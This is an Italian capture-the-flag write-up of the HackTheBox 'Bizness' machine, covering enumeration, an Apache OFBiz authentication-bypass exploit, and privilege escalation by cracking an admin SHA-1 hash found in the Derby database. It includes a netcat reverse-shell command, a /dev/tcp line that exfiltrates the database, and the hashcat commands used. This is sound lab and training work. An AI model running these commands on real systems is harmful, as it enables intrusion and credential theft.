
**TARGET: 10.10.11.252**
# INFORMATION GHATERING

Iniziamo con un semplice scan di [Nmap](Note/Tool/Nmap.md)
```bash
┌──(root㉿kali)-[/home/kali]
└─# nmap -sTVC 10.10.11.252
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-26 21:25 CEST
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.043s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-title: BizNess Incorporated
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-nextprotoneg:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds
```

abbiamo un 3 porte aperte

* 22 ssh OpenSSH
* 80 http nginx 1.18.0
* 443 ssl/http nginx 1.18.0*

possiamo notare un redirect a `https://bizness.htb` lo aggiungiamo al nostro `etc/hots`
e andiamo a visitare la pagina 

# ENUMERATION

![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/bizness1.png)
Esplorando il sito non troviamo nulla d'interessante, proviamo ad enumerare le directory con [Dirbserch]
```bash
┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u https://bizness.htb -e*
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz | HTTP method: GET | Threads: 25 | Wordlist size: 14594

Output File: /home/kali/reports/https_bizness.htb/_24-05-26_21-34-29.txt

Target: https://bizness.htb/

[21:34:29] Starting:
[21:34:52] 400 -  795B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[21:34:54] 400 -  795B  - /a%5c.aspx
[21:34:57] 302 -    0B  - /accounting  ->  https://bizness.htb/accounting/
[21:35:52] 302 -    0B  - /catalog  ->  https://bizness.htb/catalog/
[21:35:57] 302 -    0B  - /common  ->  https://bizness.htb/common/
[21:35:57] 404 -  762B  - /common/
[21:35:57] 404 -  779B  - /common/config/db.ini
[21:35:57] 404 -  780B  - /common/config/api.ini
[21:36:01] 302 -    0B  - /content  ->  https://bizness.htb/content/
[21:36:01] 302 -    0B  - /content/  ->  https://bizness.htb/content/control/main
[21:36:01] 302 -    0B  - /content/debug.log  ->  https://bizness.htb/content/control/main
[21:36:02] 200 -   34KB - /control
[21:36:02] 200 -   34KB - /control/
[21:36:02] 200 -   11KB - /control/login
[21:36:07] 404 -  741B  - /default.jsp
[21:36:07] 404 -  763B  - /default.html
[21:36:13] 302 -    0B  - /error  ->  https://bizness.htb/error/
[21:36:13] 404 -  761B  - /error/
[21:36:13] 404 -  770B  - /error/error.log
[21:36:14] 302 -    0B  - /example  ->  https://bizness.htb/example/
[21:36:28] 404 -  762B  - /images/
[21:36:28] 302 -    0B  - /images  ->  https://bizness.htb/images/
[21:36:28] 404 -  769B  - /images/Sym.php
[21:36:28] 404 -  768B  - /images/README
[21:36:28] 404 -  769B  - /images/c99.php
[21:36:30] 302 -    0B  - /index.jsp  ->  https://bizness.htb/control/main
[21:36:52] 404 -  682B  - /META-INF
[21:37:48] 302 -    0B  - /solr/  -> https://bizness.htb/solr/control/checkLogin/
[21:37:48] 200 -   21B  - /solr/admin/
[21:37:49] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml
...<snip>...
```

Abbimao diversi codici 200 andiamo ad analizzarli 

`/control/login`
![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/bizness2.png)

Ci troviamo difronte ad un form di login di OFBiz vediamo se troviamo qualche vulnerabilità
# GAINING AN INITIAL FOOTHOLD

Cercando su google ci imbattiamo in questa RCE [Apache OFBiz Authentication Bypass Vulnerability (CVE-2023-51467 and CVE-2023-49070)](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass?tab=readme-ov-file)

ci scarichiamo la repository 
```bash
┌──(root㉿kali)-[/home/kali/htb/bizness]
└─# git clone https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass.git
Cloning into 'Apache-OFBiz-Authentication-Bypass'...
remote: Enumerating objects: 19, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (12/12), done.
remote: Total 19 (delta 3), reused 7 (delta 1), pack-reused 5
Receiving objects: 100% (19/19), 51.44 MiB | 4.88 MiB/s, done.
Resolving deltas: 100% (3/3), done.
```

leggendo il `README` verifichiamo se il nostro target è vulnerabile all'exploit

```bash
┌──(root㉿kali)-[/home/kali/htb/bizness/Apache-OFBiz-Authentication-Bypass]
└─# python3 exploit.py --url https://bizness.htb
[+] Scanning started...
[+] Apache OFBiz instance seems to be vulnerable.

```

perfetto è vulnerabile procediamo, apriamo un altro terminale e ci mettiamo in ascolto con [Netcat](../Note/Tool/Netcat.md)

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4445
listening on [any] 4445 ...
```

ed eseguiamo l'exploit
```bash
┌──(root㉿kali)-[/home/kali/htb/bizness/Apache-OFBiz-Authentication-Bypass]
└─# python3 exploit.py --url https://bizness.htb --cmd 'nc -e /bin/sh 10.10.14.21 4445'
[+] Generating payload...
[+] Payload generated successfully.
[+] Sending malicious serialized payload...
[+] The request has been successfully sent. Check the result of the command.
```

Verifichiamo su nc, e siamo dentro.

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.252] 50920
whoami
ofbiz
which python3
/bin/python3
```

facciamo l'upgrade alla shell e ci prendiamo la nostra user flag

```bash
ofbiz@bizness:/home$ cd ofbiz/
ofbiz@bizness:~$ ls
user.txt
ofbiz@bizness:~$ cat user.txt
826d1395d7b00a4b9e29620ff5095e4a
```

# PRIVESC

L'enumerazione standard del sistema non ci porta da nessuna parte, quindi diamo uno sguardo più da vicino alla configurazione OFBiz. L'installazione si trova in `/opt/ofbiz/
La nostra ricerca ci porta alla conclusione che la directory `framework/` contiene la maggior parte dei file di configurazione che potrebbero interessarci, poiché contiene tutti i cosiddetti componenti gestiti da OFBiz

Una sottodirectory chiamata `securty` attira la nostra attenzione e indaghiamo ulteriormente. I componenti in OFBiz sono tutti strutturati allo stesso modo e contengono un file ofbiz-component.xml, nonché config/ ,
data/ e src/ directory, tra gli altri. All'interno della directory config troviamo il file security.properties, che contiene la seguente voce:

```bash
# -- specify the type of hash to use for one-way encryption, will be passed to
java.security.MessageDigest.getInstance() --
# -- options may include: SHA, PBKDF2WithHmacSHA1, PBKDF2WithHmacSHA256,
PBKDF2WithHmacSHA384, PBKDF2WithHmacSHA512 and etc
password.encrypt.hash.type=SHA
```

Questa è un'installazione predefinita di OFBiz, poiché sembra che l'algoritmo di hashing per le password non sia stato modificato da SHA-1.
Questa è una buona notizia per noi, dal momento che SHA-1 non è più considerato un algoritmo di hashing sicuro, quindi se riusciamo a trovare le password memorizzate, potremmo essere in grado di decifrarle.
Ciò solleva la domanda successiva, vale a dire dove sono archiviate le password e altre informazioni in Apache OFBiz. La nostra ricerca rivela che, per impostazione predefinita, OFBiz utilizza un database Java incorporato chiamato Apache Derby.

La lettura di varia documentazione ci porta alla conclusione che i file di Derby sono archiviati nella directory runtime/opt/ofbiz/runtime/data/derby

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ ls -la
total 24
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 Dec 21 09:15 .
drwxr-xr-x 3 ofbiz ofbiz-operator 4096 Dec 21 09:15 ..
-rw-r--r-- 1 ofbiz ofbiz-operator 2320 May 23 07:04 derby.log
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 May 23 07:04 ofbiz
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 May 23 07:04 ofbizolap
drwxr-xr-x 5 ofbiz ofbiz-operator 4096 May 23 07:04 ofbiztenant
```

Poiché Derby è un database incorporato, non ha una porta a cui possiamo connetterci, né un singolo file che possiamo enumerare (come in SQLite, ad esempio). I dati vengono archiviati in una combinazione di file e cartelle diversi. Fortunatamente, possiamo usare il comando ij fornito da derby-tools per dare un senso a questo formato.

> [NB] Il pacchetto può essere installato sulla maggior parte delle distribuzioni Linux utilizzando un gestore di pacchetti come apt:
> sudo apt install derby-tools

Per prima cosa estraiamo la cartella ofbiz all'interno della directory derby sul nostro sistema locale. Localmente, impostiamo un ascoltatore Netcat che scrive su un file:

```bash
nc -nlvp 4444 > ofbiz.tar
```

Sulla destinazione, utilizziamo tar per comprimere la directory in un singolo file, quindi inserirla in /dev/tcp per scriverla nel nostro nc

```bash
cd /opt/ofbiz/runtime/data/derby
tar cvf ofbiz.tar ofbiz
cat ofbiz.tar > /dev/tcp/10.10.14.21/4444
```

Una volta scaricato, estraiamo l'archivio e utilizziamo ij per ispezionare il database sulla nostra macchina attaccante.

La connessione al database vero e proprio non è esattamente semplice, ma un po' più di ricerca ci porta a questo comando:

```bash
ij> connect 'jdbc:derby:/opt/ofbiz/runtime/data/derby/ofbiz';
```

Nel nostro caso, dobbiamo solo cambiare la directory in ./ofbiz :

```bash
ij> connect 'jdbc:derby:./ofbiz';
```

Una volta connessi, possiamo utilizzare normali istruzioni SQL per interagire con il database.

```bash
SHOW TABLES;
```

L'enumerazione delle tabelle rivela 877 voci. Li esaminiamo fino a quando questi attirano la nostra attenzione:
```bash

|USER_LOGIN                    |
|USER_LOGIN_HISTORY            |
|USER_LOGIN_PASSWORD_HISTORY   |
|USER_LOGIN_SECURITY_GROUP     |
|USER_LOGIN_SECURITY_QUESTION  |
|USER_LOGIN_SESSION            |
|USER_PREFERENCE               |
|USER_PREF_GROUP_TYPE          |

```

La prima colonna specifica lo schema della tabella, quindi possiamo scaricarne il contenuto come segue:

```bash
SELECT USER_LOGIN_ID,CURRENT_PASSWORD FROM OFBIZ.USER_LOGIN;

USER_LOGIN_ID               |CURRENT_PASSWORD
        ---------------------------------------------------------------

system                         |NULL
anonymous                      |NULL
admin                          |$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I
3 rows selected
```

Se diamo impasto l'hash ad [John The Ripple](../Note/Tool/John%20The%20Ripple.md) o [Hashcat](../Note/Tool/Hashcat.md) riceviamo errori, ci deve essere qualcosa di stano nell'hash

Facendo  qualche ricerca. Mi imbatterò in [questo](https://issues.apache.org/jira/browse/OFBIZ-10843) post del 2015

Quindi è probabile che sia SHA1. Fa riferimento a cryptBytes, una funzione che assomiglia a:

`cryptBytes​(java.lang.String hashType, java.lang.String salt, byte[] byte)

Richiede un tipo, un salt ,dei bytes e restituisce un hash nel formato $SHA$[stuff]$[stuff], che è lo stesso formato del mio hash.

Se guardo l'ultima sezione del mio hash, è codificata base64
![](../Hackthebox-OSCP-Prepartion/zzz_rev/attachments/bizness3.webp)

quindi se `uP0_QaVBpDWFeo8-dRzDqRwXQ2I` è lo SHA1 codificato base64, lasciamo "d" come salt. hashcat prende il formato hash:salt, che posso inserire in un file:

```bash
┌──(root㉿kali)-[/home/kali/htb/bizness/Apache-OFBiz-Authentication-Bypass]
└─# cat hash_mod
b8fd3f41a541a435857a8f3e751cc3a91c174362:d
```

proviamo a rompere l'hash con [Hashcat](../Note/Tool/Hashcat.md)
```bash
┌──(root㉿kali)-[/home/kali/htb/bizness/Apache-OFBiz-Authentication-Bypass]
└─# hashcat -m 120 -a 0 hash_mod /usr/share/wordlists/rockyou.txt --show
b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness
```

Passiamo all'utente root e ci prendiamo la nostra root flag

```bash
ofbiz@bizness:/opt/ofbiz/runtime/data/derby$ su root
Password:
root@bizness:/opt/ofbiz/runtime/data/derby# cat /root/root.txt
28d4254d4a577f17b9bdd3131f15c08b
```